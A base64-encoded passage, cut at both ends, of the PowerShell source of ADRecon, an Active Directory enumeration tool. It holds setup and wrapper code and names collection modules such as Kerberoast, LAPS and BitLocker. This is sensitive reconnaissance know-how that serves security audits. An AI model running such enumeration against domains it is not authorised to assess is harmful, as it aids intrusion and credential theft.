lcmJvc2UgIlJlbW92ZWQgRW1wdHkgRGlyZWN0b3J5ICRYTUxQYXRoIgogICAgICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gJFhNTFBhdGgKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAnSlNPTicKICAgICAgICB7CiAgICAgICAgICAgICRKU09OUGF0aCAgPSAtam9pbigkQURST3V0cHV0RGlyLCdcJywnSlNPTi1GaWxlcycpCiAgICAgICAgICAgIElmICghKFRlc3QtUGF0aCAtUGF0aCAkSlNPTlBhdGhcKikpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlJlbW92ZWQgRW1wdHkgRGlyZWN0b3J5ICRKU09OUGF0aCIKICAgICAgICAgICAgICAgIFJlbW92ZS1JdGVtICRKU09OUGF0aAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICdIVE1MJwogICAgICAgIHsKICAgICAgICAgICAgJEhUTUxQYXRoICA9IC1qb2luKCRBRFJPdXRwdXREaXIsJ1wnLCdIVE1MLUZpbGVzJykKICAgICAgICAgICAgSWYgKCEoVGVzdC1QYXRoIC1QYXRoICRIVE1MUGF0aFwqKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiUmVtb3ZlZCBFbXB0eSBEaXJlY3RvcnkgJEhUTUxQYXRoIgogICAgICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gJEhUTUxQYXRoCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBJZiAoIShUZXN0LVBhdGggLVBhdGggJEFEUk91dHB1dERpclwqKSkKICAgIHsKICAgICAgICBSZW1vdmUtSXRlbSAkQURST3V0cHV0RGlyCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiUmVtb3ZlZCBFbXB0eSBEaXJlY3RvcnkgJEFEUk91dHB1dERpciIKICAgIH0KfQoKRnVuY3Rpb24gR2V0LUFEUkFib3V0CnsKPCMKLlNZTk9QU0lTCiAgICBSZXR1cm5zIGluZm9ybWF0aW9uIGFib3V0IEFEUmVjb24uCgouREVTQ1JJUFRJT04KICAgIFJldHVybnMgaW5mb3JtYXRpb24gYWJvdXQgQURSZWNvbi4KCi5QQVJBTUVURVIgUHJvdG9jb2wKICAgIFtzdHJpbmddCiAgICBXaGljaCBwcm90b2NvbCB0byB1c2U7IEFEV1MgKGRlZmF1bHQpIG9yIExEQVAuCgouUEFSQU1FVEVSIGRhdGUKICAgIFtEYXRlVGltZV0KICAgIERhdGUKCi5QQVJBTUVURVIgQURSZWNvblZlcnNpb24KICAgIFtzdHJpbmddCiAgICBBRFJlY29uIFZlcnNpb24uCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgQ3JlZGVudGlhbHMuCgouUEFSQU1FVEVSIFJhbm9uQ29tcHV0ZXIKICAgIFtzdHJpbmddCiAgICBEZXRhaWxzIG9mIHRoZSBDb21wdXRlciBydW5uaW5nIEFEUmVjb24uCgouUEFSQU1FVEVSIFRvdGFsVGltZQogICAgW3N0cmluZ10KICAgIFRvdGFsVGltZS4KCi5PVVRQVVRTCiAgICBQU09iamVjdC4KIz4KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtzdHJpbmddICRQcm90b2NvbCwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0RhdGVUaW1lXSAkZGF0ZSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW3N0cmluZ10gJEFEUmVjb25WZXJzaW9uLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW3N0cmluZ10gJFJhbm9uQ29tcHV0ZXIsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtzdHJpbmddICRUb3RhbFRpbWUKICAgICkKCiAgICAkQWJvdXRBRFJlY29uID0gQCgpCgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0FEV1MnKQogICAgewogICAgICAgICRWZXJzaW9uID0gIlJTQVQgVmVyc2lvbiIKICAgIH0KICAgIEVsc2UKICAgIHsKICAgICAgICAkVmVyc2lvbiA9ICJMREFQIFZlcnNpb24iCiAgICB9CgogICAgSWYgKCRDcmVkZW50aWFsIC1uZSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5KQogICAgewogICAgICAgICRVc2VybmFtZSA9ICQoJENyZWRlbnRpYWwuVXNlck5hbWUpCiAgICB9CiAgICBFbHNlCiAgICB7CiAgICAgICAgJFVzZXJuYW1lID0gJChbRW52aXJvbm1lbnRdOjpVc2VyTmFtZSkKICAgIH0KCiAgICAkT2JqVmFsdWVzID0gQCgiRGF0ZSIsICQoJGRhdGUpLCAiQURSZWNvbiIsICJodHRwczovL2dpdGh1Yi5jb20vc2Vuc2Utb2Ytc2VjdXJpdHkvQURSZWNvbiIsICRWZXJzaW9uLCAkKCRBRFJlY29uVmVyc2lvbiksICJSYW4gYXMgdXNlciIsICRVc2VybmFtZSwgIlJhbiBvbiBjb21wdXRlciIsICRSYW5vbkNvbXB1dGVyLCAiRXhlY3V0aW9uIFRpbWUgKG1pbnMpIiwgJCgkVG90YWxUaW1lKSkKCiAgICBGb3IgKCRpID0gMDsgJGkgLWx0ICQoJE9ialZhbHVlcy5Db3VudCk7ICRpKyspCiAgICB7CiAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkNhdGVnb3J5IiAtVmFsdWUgJE9ialZhbHVlc1skaV0KICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlZhbHVlIiAtVmFsdWUgJE9ialZhbHVlc1skaSsxXQogICAgICAgICRpKysKICAgICAgICAkQWJvdXRBRFJlY29uICs9ICRPYmoKICAgIH0KICAgIFJldHVybiAkQWJvdXRBRFJlY29uCn0KCkZ1bmN0aW9uIEludm9rZS1BRFJlY29uCnsKPCMKLlNZTk9QU0lTCiAgICBXcmFwcGVyIGZ1bmN0aW9uIHRvIHJ1biBBRFJlY29uIG1vZHVsZXMuCgouREVTQ1JJUFRJT04KICAgIFdyYXBwZXIgZnVuY3Rpb24gdG8gc2V0IHZhcmlhYmxlcywgY2hlY2sgZGVwZW5kZW5jaWVzIGFuZCBydW4gQURSZWNvbiBtb2R1bGVzLgoKLlBBUkFNRVRFUiBQcm90b2NvbAogICAgW3N0cmluZ10KICAgIFdoaWNoIHByb3RvY29sIHRvIHVzZTsgQURXUyAoZGVmYXVsdCkgb3IgTERBUC4KCi5QQVJBTUVURVIgQ29sbGVjdAogICAgW2FycmF5XQogICAgV2hpY2ggbW9kdWxlcyB0byBydW47IEZvcmVzdCwgRG9tYWluLCBUcnVzdHMsIFNpdGVzLCBTdWJuZXRzLCBQYXNzd29yZFBvbGljeSwgRmluZUdyYWluZWRQYXNzd29yZFBvbGljeSwgRG9tYWluQ29udHJvbGxlcnMsIFVzZXJzLCBVc2VyU1BOcywgUGFzc3dvcmRBdHRyaWJ1dGVzLCBHcm91cHMsIEdyb3VwTWVtYmVycywgT1VzLCBHUE9zLCBnUExpbmtzLCBETlNab25lcywgUHJpbnRlcnMsIENvbXB1dGVycywgQ29tcHV0ZXJTUE5zLCBMQVBTLCBCaXRMb2NrZXIsIEFDTHMsIEdQT1JlcG9ydCwgS2VyYmVyb2FzdCwgRG9tYWluQWNjb3VudHN1c2VkZm9yU2VydmljZUxvZ29uLgoKLlBBUkFNRVRFUiBEb21haW5Db250cm9sbGVyCiAgICBbc3RyaW5nXQogICAgSVAgQWRkcmVzcyBvZiB0aGUgRG9tYWluIENvbnRyb2xsZXIuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgQ3JlZGVudGlhbHMuCgouUEFSQU1FVEVSIE91dHB1dERpcgogICAgW3N0cmluZ10KCVBhdGggZm9yIEFEUmVjb24gb3V0cHV0IGZvbGRlciB0byBzYXZlIHRoZSBDU1YgZmlsZXMgYW5kIHRoZSBBRFJlY29uLVJlcG9ydC54bHN4LgoKLlBBUkFNRVRFUiBEb3JtYW50VGltZVNwYW4KICAgIFtpbnRdCiAgICBUaW1lc3BhbiBmb3IgRG9ybWFudCBhY2NvdW50cy4gRGVmYXVsdCA5MCBkYXlzLgoKLlBBUkFNVEVSIFBhc3NNYXhBZ2UKICAgIFtpbnRdCiAgICBNYXhpbXVtIG1hY2hpbmUgYWNjb3VudCBwYXNzd29yZCBhZ2UuIERlZmF1bHQgMzAgZGF5cwoKLlBBUkFNRVRFUiBQYWdlU2l6ZQogICAgW2ludF0KICAgIFRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4gRGVmYXVsdCAyMDAuCgouUEFSQU1FVEVSIFRocmVhZHMKICAgIFtpbnRdCiAgICBUaGUgbnVtYmVyIG9mIHRocmVhZHMgdG8gdXNlIGR1cmluZyBwcm9jZXNzaW5nIG9mIG9iamVjdHMuIERlZmF1bHQgMTAuCgouUEFSQU1FVEVSIFVzZUFsdENyZWRzCiAgICBbYm9vbF0KICAgIFdoZXRoZXIgdG8gdXNlIHByb3ZpZGVkIGNyZWRlbnRpYWxzIG9yIG5vdC4KCi5PVVRQVVRTCiAgICBTVERPVVQsIENTViwgWE1MLCBKU09OLCBIVE1MIGFuZC9vciBFeGNlbCBmaWxlIGlzIGNyZWF0ZWQgaW4gdGhlIGZvbGRlciBzcGVjaWZpZWQgd2l0aCB0aGUgaW5mb3JtYXRpb24uCiM+CiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW3N0cmluZ10gJEdlbkV4Y2VsLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdBRFdTJywgJ0xEQVAnKV0KICAgICAgICBbc3RyaW5nXSAkUHJvdG9jb2wgPSAnQURXUycsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFthcnJheV0gJENvbGxlY3QsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbc3RyaW5nXSAkRG9tYWluQ29udHJvbGxlciA9ICcnLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW2FycmF5XSAkT3V0cHV0VHlwZSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtzdHJpbmddICRBRFJPdXRwdXREaXIsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbaW50XSAkRG9ybWFudFRpbWVTcGFuID0gOTAsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbaW50XSAkUGFzc01heEFnZSA9IDMwLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW2ludF0gJFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW2ludF0gJFRocmVhZHMgPSAxMCwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtib29sXSAkVXNlQWx0Q3JlZHMgPSAkZmFsc2UKICAgICkKCiAgICBbc3RyaW5nXSAkQURSZWNvblZlcnNpb24gPSAidjEuMSIKICAgIFdyaXRlLU91dHB1dCAiWypdIEFEUmVjb24gJEFEUmVjb25WZXJzaW9uIGJ5IFByYXNoYW50IE1haGFqYW4gKEBwcmFzaGFudDM1MzUpIgoKICAgIElmICgkR2VuRXhjZWwpCiAgICB7CiAgICAgICAgSWYgKCEoVGVzdC1QYXRoICRHZW5FeGNlbCkpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1PdXRwdXQgIltJbnZva2UtQURSZWNvbl0gSW52YWxpZCBQYXRoIC4uLiBFeGl0aW5nIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CiAgICAgICAgRXhwb3J0LUFEUkV4Y2VsIC1FeGNlbFBhdGggJEdlbkV4Y2VsCiAgICAgICAgUmV0dXJuICRudWxsCiAgICB9CgogICAgIyBTdXBwcmVzcyB2ZXJib3NlIG91dHB1dAogICAgJFNhdmVWZXJib3NlUHJlZmVyZW5jZSA9ICRzY3JpcHQ6VmVyYm9zZVByZWZlcmVuY2UKICAgICRzY3JpcHQ6VmVyYm9zZVByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScKICAgIFRyeQogICAgewogICAgICAgIElmICgkUFNWZXJzaW9uVGFibGUuUFNWZXJzaW9uLk1ham9yIC1uZSAyKQogICAgICAgIHsKICAgICAgICAgICAgJGNvbXB1dGVyID0gR2V0LUNpbUluc3RhbmNlIC1DbGFzc05hbWUgV2luMzJfQ29tcHV0ZXJTeXN0ZW0KICAgICAgICAgICAgJGNvbXB1dGVyZG9tYWlucm9sZSA9ICgkY29tcHV0ZXIpLkRvbWFpblJvbGUKICAgICAgICB9CiAgICAgICAgRWxzZQogICAgICAgIHsKICAgICAgICAgICAgJGNvbXB1dGVyID0gR2V0LVdNSU9iamVjdCB3aW4zMl9jb21wdXRlcnN5c3RlbQogICAgICAgICAgICAkY29tcHV0ZXJkb21haW5yb2xlID0gKCRjb21wdXRlcikuRG9tYWluUm9sZQogICAgICAgIH0KICAgIH0KICAgIENhdGNoCiAgICB7CiAgICAgICAgV3JpdGUtT3V0cHV0ICJbSW52b2tlLUFEUmVjb25dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgfQogICAgSWYgKCRTYXZlVmVyYm9zZVByZWZlcmVuY2UpCiAgICB7CiAgICAgICAgJHNjcmlwdDpWZXJib3NlUHJlZmVyZW5jZSA9ICRTYXZlVmVyYm9zZVByZWZlcmVuY2UKICAgICAgICBSZW1vdmUtVmFyaWFibGUgU2F2ZVZlcmJvc2VQcmVmZXJlbmNlCiAgICB9CgogICAgc3dpdGNoICgkY29tcHV0ZXJkb21haW5yb2xlKQogICAgewogICAgICAgIDAKICAgICAgICB7CiAgICAgICAgICAgIFtzdHJpbmddICRjb21wdXRlcnJvbGUgPSAiU3RhbmRhbG9uZSBXb3Jrc3RhdGlvbiIKICAgICAgICAgICAgJEVudjpBRFBTX0xvYWREZWZhdWx0RHJpdmUgPSAwCiAgICAgICAgICAgICRVc2VBbHRDcmVkcyA9ICR0cnVlCiAgICAgICAgfQogICAgICAgIDEgeyBbc3RyaW5nXSAkY29tcHV0ZXJyb2xlID0gIk1lbWJlciBXb3Jrc3RhdGlvbiIgfQogICAgICAgIDIKICAgICAgICB7CiAgICAgICAgICAgIFtzdHJpbmddICRjb21wdXRlcnJvbGUgPSAiU3RhbmRhbG9uZSBTZXJ2ZXIiCiAgICAgICAgICAgICRVc2VBbHRDcmVkcyA9ICR0cnVlCiAgICAgICAgICAgICRFbnY6QURQU19Mb2FkRGVmYXVsdERyaXZlID0gMAogICAgICAgIH0KICAgICAgICAzIHsgW3N0cmluZ10gJGNvbXB1dGVycm9sZSA9ICJNZW1iZXIgU2VydmVyIiB9CiAgICAgICAgNCB7IFtzdHJpbmddICRjb21wdXRlcnJvbGUgPSAiQmFja3VwIERvbWFpbiBDb250cm9sbGVyIiB9CiAgICAgICAgNSB7IFtzdHJpbmddICRjb21wdXRlcnJvbGUgPSAiUHJpbWFyeSBEb21haW4gQ29udHJvbGxlciIgfQogICAgICAgIGRlZmF1bHQgeyBXcml0ZS1PdXRwdXQgIkNvbXB1dGVyIFJvbGUgY291bGQgbm90IGJlIGlkZW50aWZpZWQuIiB9CiAgICB9CgogICAgJFJhbm9uQ29tcHV0ZXIgPSAiJCgkY29tcHV0ZXIuZG9tYWluKVwkKFtFbnZpcm9ubWVudF06Ok1hY2hpbmVOYW1lKSAtICQoJGNvbXB1dGVycm9sZSkiCiAgICBSZW1vdmUtVmFyaWFibGUgY29tcHV0ZXIKICAgIFJlbW92ZS1WYXJpYWJsZSBjb21wdXRlcmRvbWFpbnJvbGUKICAgIFJlbW92ZS1WYXJpYWJsZSBjb21wdXRlcnJvbGUKCiAgICAjIElmIGVpdGhlciBEb21haW5Db250cm9sbGVyIG9yIENyZWRlbnRpYWxzIGFyZSBwcm92aWRlZCwgdHJlYXQgYXMgbm9uLW1lbWJlcgogICAgSWYgKCgkRG9tYWluQ29udHJvbGxlciAtbmUgIiIpIC1vciAoJENyZWRlbnRpYWwgLW5lIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkpKQogICAgewogICAgICAgICMgRGlzYWJsZSBsb2FkaW5nIG9mIGRlZmF1bHQgZHJpdmUgb24gbWVtYmVyCiAgICAgICAgSWYgKCgkUHJvdG9jb2wgLWVxICdBRFdTJykgLWFuZCAoLU5vdCAkVXNlQWx0Q3JlZHMpKQogICAgICAgIHsKICAgICAgICAgICAgJEVudjpBRFBTX0xvYWREZWZhdWx0RHJpdmUgPSAwCiAgICAgICAgfQogICAgICAgICRVc2VBbHRDcmVkcyA9ICR0cnVlCiAgICB9CgogICAgIyBJbXBvcnQgQWN0aXZlRGlyZWN0b3J5IG1vZHVsZQogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0FEV1MnKQogICAgewogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgIyBTdXBwcmVzcyB2ZXJib3NlIG91dHB1dCBvbiBtb2R1bGUgaW1wb3J0CiAgICAgICAgICAgICRTYXZlVmVyYm9zZVByZWZlcmVuY2UgPSAkc2NyaXB0OlZlcmJvc2VQcmVmZXJlbmNlOwogICAgICAgICAgICAkc2NyaXB0OlZlcmJvc2VQcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnOwogICAgICAgICAgICBJbXBvcnQtTW9kdWxlIEFjdGl2ZURpcmVjdG9yeSAtV2FybmluZ0FjdGlvbiBTdG9wIC1FcnJvckFjdGlvbiBTdG9wIHwgT3V0LU51bGwKICAgICAgICAgICAgSWYgKCRTYXZlVmVyYm9zZVByZWZlcmVuY2UpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRzY3JpcHQ6VmVyYm9zZVByZWZlcmVuY2UgPSAkU2F2ZVZlcmJvc2VQcmVmZXJlbmNlCiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgU2F2ZVZlcmJvc2VQcmVmZXJlbmNlCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltJbnZva2UtQURSZWNvbl0gRXJyb3IgaW1wb3J0aW5nIEFjdGl2ZURpcmVjdG9yeSBNb2R1bGUgZnJvbSBSU0FUIChSZW1vdGUgU2VydmVyIEFkbWluaXN0cmF0aW9uIFRvb2xzKSAuLi4gQ29udGludWluZyB3aXRoIExEQVAiCiAgICAgICAgICAgICRQcm90b2NvbCA9ICdMREFQJwogICAgICAgICAgICBJZiAoJFNhdmVWZXJib3NlUHJlZmVyZW5jZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHNjcmlwdDpWZXJib3NlUHJlZmVyZW5jZSA9ICRTYXZlVmVyYm9zZVByZWZlcmVuY2UKICAgICAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBTYXZlVmVyYm9zZVByZWZlcmVuY2UKICAgICAgICAgICAgfQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICB9CiAgICB9CgogICAgIyBDb21waWxlIEMjIGNvZGUKICAgICMgU3VwcHJlc3MgRGVidWcgb3V0cHV0CiAgICAkU2F2ZURlYnVnUHJlZmVyZW5jZSA9ICRzY3JpcHQ6RGVidWdQcmVmZXJlbmNlCiAgICAkc2NyaXB0OkRlYnVnUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJwogICAgVHJ5CiAgICB7CiAgICAgICAgJEFkdmFwaTMyID0gQWRkLVR5cGUgLU1lbWJlckRlZmluaXRpb24gJEFkdmFwaTMyRGVmIC1OYW1lICJBZHZhcGkzMiIgLU5hbWVzcGFjZSBBRFJlY29uIC1QYXNzVGhydQogICAgICAgICRLZXJuZWwzMiA9IEFkZC1UeXBlIC1NZW1iZXJEZWZpbml0aW9uICRLZXJuZWwzMkRlZiAtTmFtZSAiS2VybmVsMzIiIC1OYW1lc3BhY2UgQURSZWNvbiAtUGFzc1RocnUKICAgICAgICBBZGQtVHlwZSAtVHlwZURlZmluaXRpb24gJFBpbmdDYXN0bGVTTUJTY2FubmVyU291cmNlCiAgICAgICAgJENMUiA9IChbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHldOjpHZXRFeGVjdXRpbmdBc3NlbWJseSgpLkltYWdlUnVudGltZVZlcnNpb24pWzFdCiAgICAgICAgSWYgKCRQcm90b2NvbCAtZXEgJ0FEV1MnKQogICAgICAgIHsKICAgICAgICAgICAgSWYgKCRDTFIgLWVxICI0IikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uICRBRFdTU291cmNlIC1SZWZlcmVuY2VkQXNzZW1ibGllcyAoW1N5c3RlbS5TdHJpbmdbXV1AKChbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkV2l0aFBhcnRpYWxOYW1lKCJNaWNyb3NvZnQuQWN0aXZlRGlyZWN0b3J5Lk1hbmFnZW1lbnQiKSkuTG9jYXRpb24sKFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWRXaXRoUGFydGlhbE5hbWUoIlN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcyIpKS5Mb2NhdGlvbikpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgRWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBBZGQtVHlwZSAtVHlwZURlZmluaXRpb24gJEFEV1NTb3VyY2UgLVJlZmVyZW5jZWRBc3NlbWJsaWVzIChbU3lzdGVtLlN0cmluZ1tdXUAoKFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWRXaXRoUGFydGlhbE5hbWUoIk1pY3Jvc29mdC5BY3RpdmVEaXJlY3RvcnkuTWFuYWdlbWVudCIpKS5Mb2NhdGlvbiwoW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZFdpdGhQYXJ0aWFsTmFtZSgiU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzIikpLkxvY2F0aW9uKSkgLUxhbmd1YWdlIENTaGFycFZlcnNpb24zCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIElmICgkUHJvdG9jb2wgLWVxICdMREFQJykKICAgICAgICB7CiAgICAgICAgICAgIElmICgkQ0xSIC1lcSAiNCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIEFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiAkTERBUFNvdXJjZSAtUmVmZXJlbmNlZEFzc2VtYmxpZXMgKFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWRXaXRoUGFydGlhbE5hbWUoIlN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcyIpKS5Mb2NhdGlvbgogICAgICAgICAgICB9CiAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uICRMREFQU291cmNlIC1SZWZlcmVuY2VkQXNzZW1ibGllcyAoW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZFdpdGhQYXJ0aWFsTmFtZSgiU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzIikpLkxvY2F0aW9uIC1MYW5ndWFnZSBDU2hhcnBWZXJzaW9uMwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgQ2F0Y2gKICAgIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIltJbnZva2UtQURSZWNvbl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgUmV0dXJuICRudWxsCiAgICB9CiAgICBJZiAoJFNhdmVEZWJ1Z1ByZWZlcmVuY2UpCiAgICB7CiAgICAgICAgJHNjcmlwdDpEZWJ1Z1ByZWZlcmVuY2UgPSAkU2F2ZURlYnVnUHJlZmVyZW5jZQogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBTYXZlRGVidWdQcmVmZXJlbmNlCiAgICB9CgogICAgIyBBbGxvdyBydW5uaW5nIHVzaW5nIFJVTkFTIGZyb20gYSBub24tZG9tYWluIGpvaW5lZCBtYWNoaW5lCiAgICAjIHJ1bmFzIC91c2VyOjxEb21haW4gRlFETj5cPFVzZXJuYW1lPiAvbmV0b25seSBwb3dlcnNoZWxsLmV4ZQogICAgSWYgKCgkUHJvdG9jb2wgLWVxICdMREFQJykgLWFuZCAoJFVzZUFsdENyZWRzKSAtYW5kICgkRG9tYWluQ29udHJvbGxlciAtZXEgIiIpIC1hbmQgKCRDcmVkZW50aWFsIC1lcSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5KSkKICAgIHsKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRvYmpEb21haW4gPSBbQURTSV0iIgogICAgICAgICAgICBJZighKCRvYmpEb21haW4ubmFtZSkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltJbnZva2UtQURSZWNvbl0gUlVOQVMgQ2hlY2ssIExEQVAgYmluZCBVbnN1Y2Nlc3NmdWwiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFVzZUFsdENyZWRzID0gJGZhbHNlCiAgICAgICAgICAgICRvYmpEb21haW4uRGlzcG9zZSgpCiAgICAgICAgfQogICAgICAgIENhdGNoCiAgICAgICAgewogICAgICAgICAgICAkVXNlQWx0Q3JlZHMgPSAkdHJ1ZQogICAgICAgIH0KICAgIH0KCiAgICBJZiAoJFVzZUFsdENyZWRzIC1hbmQgKCgkRG9tYWluQ29udHJvbGxlciAtZXEgIiIpIC1vciAoJENyZWRlbnRpYWwgLWVxIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkpKSkKICAgIHsKCiAgICAgICAgSWYgKCgkRG9tYWluQ29udHJvbGxlciAtbmUgIiIpIC1hbmQgKCRDcmVkZW50aWFsIC1lcSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5KSkKICAgICAgICB7CiAgICAgICAgICAgIFRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkQ3JlZGVudGlhbCA9IEdldC1DcmVkZW50aWFsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJbSW52b2tlLUFEUmVjb25dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgRWxzZQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJSdW4gR2V0LUhlbHAgLlxBRFJlY29uLnBzMSAtRXhhbXBsZXMgZm9yIGFkZGl0aW9uYWwgaW5mb3JtYXRpb24uIgogICAgICAgICAgICBXcml0ZS1PdXRwdXQgIltJbnZva2UtQURSZWNvbl0gVXNlIHRoZSAtRG9tYWluQ29udHJvbGxlciBhbmQgLUNyZWRlbnRpYWwgcGFyYW1ldGVyLiJgbgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CiAgICB9CgogICAgV3JpdGUtT3V0cHV0ICJbKl